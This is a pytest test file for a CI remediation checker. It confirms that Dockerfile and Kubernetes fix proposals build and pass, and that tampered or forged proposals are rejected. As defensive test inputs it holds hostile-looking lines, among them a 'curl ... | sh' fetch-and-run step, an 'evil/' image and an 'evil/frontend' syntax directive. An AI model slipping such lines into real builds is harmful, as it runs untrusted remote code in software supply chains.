"""Build and tests of an infrastructure-as-code proposal (`sentinel remediate check`, task A6, SPEC §9).

Each fixer's real proposal builds and passes. Each way a patch could go wrong, by a bug or a tampered job,
fails the build or the tests, a proposal that is not the fixer's own output fails the tests, and what cannot
be checked honestly is refused (exit 3).
"""

import gzip
import io
import json
import os
import shutil
import subprocess
import tarfile
from collections.abc import Callable, Mapping
from pathlib import Path

import pytest
from typer.testing import CliRunner

from sentinelci.cli import app
from sentinelci.contracts.finding import Finding
from sentinelci.contracts.remediation import PatchProposal
from sentinelci.normalize.ndjson import dumps_ndjson
from sentinelci.remediation import check
from sentinelci.remediation.check import CheckError, check_iac
from sentinelci.remediation.dockerfile import propose as propose_dockerfile
from sentinelci.remediation.gate import check_proposal
from sentinelci.remediation.kubernetes import propose as propose_kubernetes
from sentinelci.remediation.proposal import proposal_id_of, unified_diff

from .conftest import NOW, SEED, SEED_PATH, iac_finding, seed_findings

DOCKERFILE_PATH = "svc/Dockerfile"
NOT_THE_FIXERS = "is not a change the Dockerfile fixer makes"
DOCKERFILE = (
    "# syntax=docker/dockerfile:1\n"
    "FROM debian:12 AS build\n"
    "RUN apt-get update && apt-get install -y make\n"
    "FROM debian:12\n"
    "ADD app.py /app/\n"
    "RUN apt-get update && \\\n"
    "    apt-get install -y curl\n"
    'CMD ["/app/app.py"]\n'
)


def _patched(base: Path, proposal: PatchProposal, tmp_path: Path) -> Path:
    """The base tree with the proposal's diff applied, as git applies it."""
    patched = tmp_path / "patched"
    shutil.copytree(base, patched)
    diff = tmp_path / "proposal.diff"
    diff.write_text(proposal.diff, encoding="utf-8")
    subprocess.run(["git", "apply", str(diff)], cwd=patched, check=True)
    return patched


Case = tuple[PatchProposal, Path, Path, list[Finding]]  # the proposal, base and patched trees, base findings


def kubernetes(tmp_path: Path) -> Case:
    base = tmp_path / "base"
    (base / SEED_PATH).parent.mkdir(parents=True)
    shutil.copy(SEED, base / SEED_PATH)
    findings = seed_findings()
    proposal = propose_kubernetes(findings, base, created_at=NOW).proposal
    assert proposal is not None
    return proposal, base, _patched(base, proposal, tmp_path), findings


def dockerfile(
    tmp_path: Path,
    text: str = DOCKERFILE,
    extra: Mapping[str, bytes] | None = None,
    prepare: Callable[[Path], None] | None = None,
) -> Case:
    """The fixer's proposal on a base tree holding `text`, svc/app.py, the `extra` files and what `prepare`
    makes there (given svc/), then the patched tree."""
    base = tmp_path / "base"
    (base / "svc").mkdir(parents=True)
    (base / DOCKERFILE_PATH).write_text(text, encoding="utf-8")
    (base / "svc" / "app.py").write_text("print('x')\n", encoding="utf-8")
    for name, data in (extra or {}).items():
        (base / name).write_bytes(data)
    if prepare is not None:
        prepare(base / "svc")
    findings = [iac_finding(rule, DOCKERFILE_PATH) for rule in ("DS-0002", "DS-0005", "DS-0029")]
    proposal = propose_dockerfile(findings, base, created_at=NOW).proposal
    assert proposal is not None and len(proposal.finding_ids) == 3
    return proposal, base, _patched(base, proposal, tmp_path), findings


def edit(root: Path, path: str, old: str, new: str) -> None:
    text = (root / path).read_text(encoding="utf-8")
    assert old in text, old
    (root / path).write_text(text.replace(old, new, 1), encoding="utf-8")


# ---------------------------------------------------------------- the fixers' own proposals


def test_the_kubernetes_fixers_proposal_builds_and_passes(tmp_path: Path) -> None:
    proposal, base, patched, findings = kubernetes(tmp_path)
    assert "hostNetwork: false" in (patched / SEED_PATH).read_text(), "the seed's host network is fixed too"
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok, checked.problems) == (True, True, [])


def test_the_dockerfile_fixers_proposal_builds_and_passes(tmp_path: Path) -> None:
    proposal, base, patched, findings = dockerfile(tmp_path)
    text = (patched / DOCKERFILE_PATH).read_text()
    assert "COPY app.py" in text and text.count("--no-install-recommends") == 2 and "USER 10001:10001" in text
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok, checked.problems) == (True, True, [])


# ---------------------------------------------------------------- what a patch must not do


@pytest.mark.parametrize(
    ("old", "new", "build", "problem"),
    [
        ("image: ", "image: evil/", True, "document 1 changes more than"),
        ("replicas: ", "replicas: 9\n  # was: ", True, "document 1 changes more than"),
        ("name: shop-api\n", "name: shop-api-2\n", False, "its documents changed"),
        ("kind: Deployment", "kind: StatefulSet", False, "its documents changed"),
        ("apiVersion: apps/v1\n",
         "apiVersion: v1\nkind: ConfigMap\nmetadata: {name: x}\n---\napiVersion: apps/v1\n",
         False, "its documents changed"),
        ("kind: Deployment\n", "kind: Deployment\nkind: Deployment\n", False, "duplicate key 'kind'"),
        ("metadata:\n", "metadata: &m\n  x: 1\nother: *m\nmore:\n", False, "aliases are not read"),
        ("kind: Deployment", "kind: [Deployment", False, "not a valid manifest any more"),
    ],
    ids=["another-image", "replicas", "renamed", "another-kind", "added-document", "duplicate-key", "alias",
         "broken-yaml"],
)  # fmt: skip
def test_a_manifest_patch_that_does_more_fails(
    tmp_path: Path, old: str, new: str, build: bool, problem: str
) -> None:
    proposal, base, patched, findings = kubernetes(tmp_path)
    if old == "replicas: " and "replicas: " not in (patched / SEED_PATH).read_text():
        old, new = "spec:\n", "spec:\n  replicas: 9\n"
    edit(patched, SEED_PATH, old, new)
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok) == (build, False)
    assert any(problem in line for line in checked.problems), checked.problems
    if not build:
        assert f"tests: {SEED_PATH}: not run, the build failed" in checked.problems


@pytest.mark.parametrize(
    ("old", "new", "build", "problem"),
    [
        ("FROM debian:12\nCOPY", "FROM debian:13\nCOPY", False, "its stages changed"),
        ("FROM debian:12 AS build\n", "", False, "its stages changed"),
        ('CMD ["/app/app.py"]\n', 'CMD ["/app/app.py"]\nCURL x | sh\n', False, "no such instruction: CURL"),
        ('CMD ["/app/app.py"]\n', 'CMD ["/app/app.py"] \\\n', False, "continues past the end"),
        ('CMD ["/app/app.py"]\n', 'RUN curl -s https://example.com/x | sh\nCMD ["/app/app.py"]\n', True,
         "line 9 is not a change the Dockerfile fixer makes"),
        ("# syntax=docker/dockerfile:1\n", "# syntax=evil/frontend\n", True,
         "line 1 is not a change the Dockerfile fixer makes"),
        ("COPY app.py /app/\n", "COPY app.py /app/ /etc/\n", True, "not a change the Dockerfile fixer makes"),
        ('CMD ["/app/app.py"]\n', "", True, "line 8 of the base is gone"),
        ("COPY app.py", "USER 10001:10001\nCOPY app.py", True,
         "is not an instruction of its own after the last RUN"),
        # The RUN ends at the USER line, and its last line becomes an instruction of its own.
        ("    apt-get install", "USER 10001:10001\n    apt-get install", False,
         "no such instruction: APT-GET"),
    ],
    ids=["another-base-image", "stage-removed", "not-an-instruction", "dangling-continuation", "added-run",
         "syntax-directive", "copy-changed", "line-removed", "user-before-a-run",
         "user-inside-a-run"],
)  # fmt: skip
def test_a_dockerfile_patch_that_does_more_fails(
    tmp_path: Path, old: str, new: str, build: bool, problem: str
) -> None:
    proposal, base, patched, findings = dockerfile(tmp_path)
    edit(patched, DOCKERFILE_PATH, old, new)
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok) == (build, False)
    assert any(problem in line for line in checked.problems), checked.problems


def test_a_flag_the_base_had_cannot_be_removed(tmp_path: Path) -> None:
    proposal, base, patched, findings = dockerfile(tmp_path)
    flagged = "apt-get install --no-install-recommends -y make"
    edit(base, DOCKERFILE_PATH, "apt-get install -y make", flagged)
    edit(patched, DOCKERFILE_PATH, flagged, "apt-get install -y make")
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok) == (True, False)
    assert (
        checked.problems[0] == f"tests: {DOCKERFILE_PATH}: line 3 is not a change the Dockerfile fixer makes"
    )
    assert checked.problems[1].startswith("tests: not the fixer's own proposal"), "on this base it adds less"
    assert len(checked.problems) == 2


# ---------------------------------------------------------------- the fixer's own proposal


def _tar_gz() -> bytes:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as tar:
        info = tarfile.TarInfo("vendor/lib.py")
        info.size = 2
        tar.addfile(info, io.BytesIO(b"x\n"))
    return gzip.compress(raw.getvalue(), mtime=0)


def forged(case: Case, old: str, new: str) -> Case:
    """The fixer's proposal with one more edit, its diff and id made to match (a job that rewrote the proposal
    could do as much): the gate's own check of the proposal passes."""
    proposal, base, patched, findings = case
    edit(patched, DOCKERFILE_PATH, old, new)
    diff = unified_diff(
        DOCKERFILE_PATH, (base / DOCKERFILE_PATH).read_text(), (patched / DOCKERFILE_PATH).read_text()
    )
    identity = proposal_id_of(proposal.strategy, proposal.attempt, proposal.finding_ids, diff)
    rewritten = proposal.model_copy(update={"diff": diff, "proposal_id": identity})
    check_proposal(rewritten, {finding.id: finding for finding in findings})
    return rewritten, base, patched, findings


def test_an_add_the_fixer_keeps_cannot_become_copy(tmp_path: Path) -> None:
    """COPY cannot fetch a URL or unpack an archive. The archive is at the repository root, where
    `docker build -f svc/Dockerfile .` finds it: the line rule and the replay both look there."""
    url, archive = "ADD https://example.invalid/app.tar.gz /srv/\n", "ADD vendor.tar.gz /opt/\n"
    text = DOCKERFILE.replace("ADD app.py /app/\n", "ADD app.py /app/\n" + url + archive)
    for number, line in enumerate((url, archive)):
        case = dockerfile(tmp_path / str(number), text, {"vendor.tar.gz": _tar_gz()})
        assert line in case[2].joinpath(DOCKERFILE_PATH).read_text(), "the fixer keeps this ADD"
        proposal, base, patched, findings = forged(case, line, line.replace("ADD", "COPY", 1))
        at = (patched / DOCKERFILE_PATH).read_text().splitlines().index(line.replace("ADD", "COPY", 1)[:-1])
        checked = check_iac(proposal, base, patched, findings)
        assert (checked.build_ok, checked.tests_ok) == (True, False)
        assert checked.problems == [
            f"tests: {DOCKERFILE_PATH}: line {at + 1} {NOT_THE_FIXERS}",
            "tests: not the fixer's own proposal: on the base tree and findings it proposes "
            f"{case[0].proposal_id} (proposal_id, diff differ)",
        ]


def test_add_becomes_copy_only_on_the_first_line_of_an_add(tmp_path: Path) -> None:
    """#65 review, nit 1: `add` at the start of a RUN's continuation line is not an ADD instruction, whatever
    its case: both checks say so."""
    run = "RUN apk update && apk \\\n    add curl\n"
    case = dockerfile(tmp_path, DOCKERFILE.replace("ADD app.py /app/\n", "ADD app.py /app/\n" + run))
    proposal, base, patched, findings = forged(case, "    add curl\n", "    COPY curl\n")
    line = (patched / DOCKERFILE_PATH).read_text().splitlines().index("    COPY curl") + 1
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok) == (True, False)
    assert checked.problems[0] == f"tests: {DOCKERFILE_PATH}: line {line} {NOT_THE_FIXERS}"
    assert checked.problems[1].startswith("tests: not the fixer's own proposal")


def test_every_field_but_the_time_is_the_fixers(tmp_path: Path) -> None:
    proposal, base, patched, findings = kubernetes(tmp_path)
    later = proposal.model_copy(update={"created_at": NOW.replace(hour=11)})
    assert check_iac(later, base, patched, findings).tests_ok, "made again, later: the same proposal"
    retry = propose_kubernetes(findings, base, attempt=2, created_at=NOW).proposal
    assert retry is not None and retry.proposal_id != proposal.proposal_id
    assert check_iac(retry, base, patched, findings).tests_ok, (
        "the fixer is re-run for the proposal's attempt"
    )
    rewritten = proposal.model_copy(update={"rationale": "VERIFIED by SentinelCI, safe to merge."})
    checked = check_iac(rewritten, base, patched, findings)
    assert checked.problems == [
        "tests: not the fixer's own proposal: on the base tree and findings it proposes "
        f"{proposal.proposal_id} (rationale differ)"
    ]
    checked = check_iac(proposal, base, patched, [])
    assert checked.problems == [
        "tests: not the fixer's own proposal: on the base tree and findings it proposes nothing"
    ]


def test_a_proposal_that_claims_other_findings_is_not_the_fixers(tmp_path: Path) -> None:
    """#98 review, should-fix 2: an under-claim with a recomputed id passes the gate's own check of the
    proposal and the line rules; only the replay sees it."""
    proposal, base, patched, findings = kubernetes(tmp_path)
    assert len(proposal.finding_ids) > 1
    fewer = proposal.finding_ids[:1]
    identity = proposal_id_of(proposal.strategy, 1, fewer, proposal.diff)
    forged = proposal.model_copy(update={"finding_ids": fewer, "proposal_id": identity})
    assert check_iac(forged, base, patched, findings).problems == [
        "tests: not the fixer's own proposal: on the base tree and findings it proposes "
        f"{proposal.proposal_id} (proposal_id, finding_ids differ)"
    ]


def test_a_strategy_with_no_fixer_to_re_run_cannot_be_checked(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """#98 review, nit 3: a CheckError (exit 3, FAILED), never a KeyError that reads as REJECTED."""
    proposal, base, patched, findings = dockerfile(tmp_path)
    monkeypatch.delitem(check.FIXERS, proposal.strategy)
    with pytest.raises(CheckError, match=r"^no deterministic fixer to re-run for deterministic:dockerfile$"):
        check_iac(proposal, base, patched, findings)


@pytest.mark.parametrize(
    ("source", "prepare"),
    [
        ("https://example.com/app.py", None),
        ("app.tar", "tar"),
        ("app.tgz", "gzip"),
        ("linked.py", "link"),
        ("missing.py", None),
        ("$APP", None),
        ("app*.py", None),
        ("--checksum=sha256:00 app.py", None),
    ],
    ids=["url", "tar", "compressed", "link", "missing", "variable", "glob", "add-only-flag"],
)
def test_add_becomes_copy_only_where_the_fixer_would_make_it_copy(
    tmp_path: Path, source: str, prepare: str | None
) -> None:
    """#65 review, nit 2: ADD fetches a URL and unpacks an archive, so COPY there is another build. The fixer
    keeps each of these ADDs; a proposal forged to make it COPY fails the line rule (which asks what the fixer
    asks, of the base tree) and the replay."""

    def made(svc: Path) -> None:
        if prepare == "tar":
            with tarfile.open(svc / "app.tar", "w") as archive:
                archive.add(svc / "app.py", arcname="app.py")
        elif prepare == "gzip":
            (svc / "app.tgz").write_bytes(gzip.compress(b"print('x')\n"))
        elif prepare == "link":
            (svc / "linked.py").symlink_to("app.py")

    line = f"ADD {source} /app/\n"
    case = dockerfile(tmp_path, DOCKERFILE.replace("ADD app.py /app/\n", line), prepare=made)
    assert line in case[2].joinpath(DOCKERFILE_PATH).read_text(), "the fixer keeps this ADD"
    proposal, base, patched, findings = forged(case, line, line.replace("ADD", "COPY", 1))
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok) == (True, False)
    assert checked.problems[0] == f"tests: {DOCKERFILE_PATH}: line 5 {NOT_THE_FIXERS}"
    assert checked.problems[1].startswith("tests: not the fixer's own proposal")
    assert len(checked.problems) == 2


SPACED = "svc/my app.tgz"  # one name, as BuildKit reads it


@pytest.mark.parametrize(
    ("line", "files"),
    [
        ("ADD ../app.py /app/\n", {"app.py": "plain", "svc/app.py": "tar"}),
        ('ADD ["my app.tgz", "/app/"]\n', {"svc/my": "plain", "svc/app.tgz": "plain", SPACED: "tar"}),
        ("ADD deploy@example.invalid:repo.git /app/\n", {"svc/deploy@example.invalid:repo.git": "plain"}),
        # BuildKit splits a quoted name with a space and the build fails; the quotes are not stripped here.
        ('ADD "my app.tgz" /app/\n', {"svc/my": "plain", "svc/app.tgz": "plain", SPACED: "tar"}),
        # #85 review: a one-word source is unquoted or unescaped by BuildKit, which then unpacks the tar.
        ('ADD "app.tgz" /app/\n', {'svc/"app.tgz"': "plain", "svc/app.tgz": "tar"}),
        ("ADD 'app.tgz' /app/\n", {"svc/'app.tgz'": "plain", "svc/app.tgz": "tar"}),
        ("ADD app\\.tgz /app/\n", {"svc/app\\.tgz": "plain", "svc/app.tgz": "tar"}),
    ],
    ids=[
        "dotdot",
        "json-space",
        "ssh-git",
        "quotes-not-stripped",
        "double-quoted",
        "single-quoted",
        "escaped",
    ],
)
def test_add_stays_where_buildkit_reads_the_source_otherwise(
    tmp_path: Path, line: str, files: dict[str, str]
) -> None:
    """#85 review, should-fix 3: BuildKit cleans `..` into the context, reads a JSON name with a space as one
    name and any `user@host:path` as a git source over SSH: the places checked are not the ones it reads. The
    fixer keeps each of these ADDs, and a proposal forged to make it COPY fails both checks."""
    extra = {name: (_tar_gz() if kind == "tar" else b"plain\n") for name, kind in files.items()}
    case = dockerfile(tmp_path, DOCKERFILE.replace("ADD app.py /app/\n", line), extra)
    assert line in case[2].joinpath(DOCKERFILE_PATH).read_text(), "the fixer keeps this ADD"
    proposal, base, patched, findings = forged(case, line, line.replace("ADD", "COPY", 1))
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok) == (True, False)
    assert checked.problems[0] == f"tests: {DOCKERFILE_PATH}: line 5 {NOT_THE_FIXERS}"
    assert checked.problems[1].startswith("tests: not the fixer's own proposal")
    assert len(checked.problems) == 2


@pytest.mark.parametrize(
    ("first", "block", "patched_block"),
    [
        ("# escape=`\n", "RUN cd /src && git `\n    add app.py docs/\n",
         "RUN cd /src && git `\n    COPY app.py docs/\n"),
        ("# syntax=docker/dockerfile:1\n", "RUN <<CMD\nadd app.py docs/\nCMD\n",
         "RUN <<CMD\nCOPY app.py docs/\nCMD\n"),
    ],
    ids=["escape-directive", "heredoc"],
)  # fmt: skip
def test_a_file_the_fixer_does_not_edit_fails_the_tests(
    tmp_path: Path, first: str, block: str, patched_block: str
) -> None:
    """#85 review, should-fix 2: the edited line is inside a RUN for Docker, whatever this parser reads. The
    fixer refuses such a file, so the replay proposes nothing either."""
    proposal, base, patched, findings = dockerfile(tmp_path)
    for root, text, before in ((base, block, "CMD"), (patched, patched_block, "USER")):
        edit(root, DOCKERFILE_PATH, "# syntax=docker/dockerfile:1\n", first)
        edit(root, DOCKERFILE_PATH, before, text + before)
    diff = unified_diff(
        DOCKERFILE_PATH, (base / DOCKERFILE_PATH).read_text(), (patched / DOCKERFILE_PATH).read_text()
    )
    identity = proposal_id_of(proposal.strategy, proposal.attempt, proposal.finding_ids, diff)
    proposal = proposal.model_copy(update={"diff": diff, "proposal_id": identity})
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok) == (True, False)
    reason = (
        "an `escape` parser directive changes how lines continue" if "escape" in first
        else "a heredoc: its lines cannot be told apart from instructions safely"
    )  # fmt: skip
    assert checked.problems[0] == (
        f"tests: {DOCKERFILE_PATH}: the Dockerfile fixer does not edit this file ({reason})"
    )
    assert checked.problems[1].startswith("tests: not the fixer's own proposal")


@pytest.mark.parametrize(
    "line",
    ['ADD ["app.py", "/app/"]\n', "ADD --chown=10001 \\\n    app.py /app/\n"],
    ids=["json", "continued"],
)
def test_a_plain_add_in_json_form_or_continued_may_become_copy(tmp_path: Path, line: str) -> None:
    """#85 review, nit 1: the JSON form is read as JSON, and a continued ADD as one instruction."""
    proposal, base, patched, findings = dockerfile(tmp_path, DOCKERFILE.replace("ADD app.py /app/\n", line))
    assert line.replace("ADD", "COPY", 1) in (patched / DOCKERFILE_PATH).read_text()
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok, checked.problems) == (True, True, [])


def test_add_of_a_plain_directory_may_become_copy(tmp_path: Path) -> None:
    proposal, base, patched, findings = dockerfile(
        tmp_path,
        DOCKERFILE.replace("ADD app.py /app/", "ADD --chown=10001 app.py static/ /app/"),
        prepare=lambda svc: (svc / "static").mkdir(),
    )
    assert "COPY --chown=10001 app.py static/ /app/" in (patched / DOCKERFILE_PATH).read_text()
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok, checked.problems) == (True, True, [])


# ---------------------------------------------------------------- what cannot be checked honestly


def test_what_cannot_be_checked_honestly_is_refused(tmp_path: Path) -> None:
    proposal, base, patched, findings = kubernetes(tmp_path)
    with pytest.raises(CheckError, match="no build or tests are defined here for strategy llm:code"):
        check_iac(proposal.model_copy(update={"strategy": "llm:code"}), base, patched, findings)
    (patched / SEED_PATH).unlink()
    os.symlink(base / SEED_PATH, patched / SEED_PATH)
    with pytest.raises(CheckError, match="not a regular file of the patched tree"):
        check_iac(proposal, base, patched, findings)
    (patched / SEED_PATH).unlink()
    with pytest.raises(CheckError, match="not a regular file of the patched tree"):
        check_iac(proposal, base, patched, findings)
    (base / SEED_PATH).write_text("kind: [\n")
    shutil.copy(base / SEED_PATH, patched / SEED_PATH)
    with pytest.raises(CheckError, match="at the base is not a manifest this check reads"):
        check_iac(proposal, base, patched, findings)
    (base / SEED_PATH).write_bytes(b"\xff" * 4)
    with pytest.raises(CheckError, match="at the base is not UTF-8"):
        check_iac(proposal, base, patched, findings)


def test_a_patched_file_that_is_not_utf8_fails_the_build(tmp_path: Path) -> None:
    proposal, base, patched, findings = kubernetes(tmp_path)
    (patched / SEED_PATH).write_bytes(b"\xff\xfe")
    checked = check_iac(proposal, base, patched, findings)
    assert (checked.build_ok, checked.tests_ok) == (False, False)
    assert checked.problems == [
        f"build: {SEED_PATH}: not UTF-8 any more",
        f"tests: {SEED_PATH}: not run, the build failed",
    ]


# ---------------------------------------------------------------- the command


def test_the_command_prints_json_and_exits_0_1_or_3(tmp_path: Path) -> None:
    proposal, base, patched, findings = kubernetes(tmp_path)
    path = tmp_path / "proposal.json"
    path.write_text(proposal.model_dump_json(), encoding="utf-8")
    (tmp_path / "base.ndjson").write_text(dumps_ndjson(findings), encoding="utf-8")
    command = ["remediate", "check", "--proposal", str(path), "--base-root", str(base),
               "--patched-root", str(patched), "--findings", str(tmp_path / "base.ndjson")]  # fmt: skip
    done = CliRunner().invoke(app, command)
    assert done.exit_code == 0, done.output
    assert json.loads(done.stdout) == {
        "proposal_id": proposal.proposal_id, "strategy": "deterministic:kubernetes", "build_ok": True,
        "tests_ok": True, "problems": [],
    }  # fmt: skip
    edit(patched, SEED_PATH, "image: ", "image: evil/")
    done = CliRunner().invoke(app, command)
    assert done.exit_code == 1 and json.loads(done.stdout)["tests_ok"] is False
    path.write_text(proposal.model_copy(update={"strategy": "llm:code"}).model_dump_json(), encoding="utf-8")
    done = CliRunner().invoke(app, command)
    assert done.exit_code == 3 and done.stdout == "" and "FAIL CLOSED" in done.stderr
    path.write_text(proposal.model_dump_json(), encoding="utf-8")
    (tmp_path / "base.ndjson").write_text("not json\n", encoding="utf-8")
    done = CliRunner().invoke(app, command)
    assert done.exit_code == 3 and done.stdout == "" and "base findings" in done.stderr
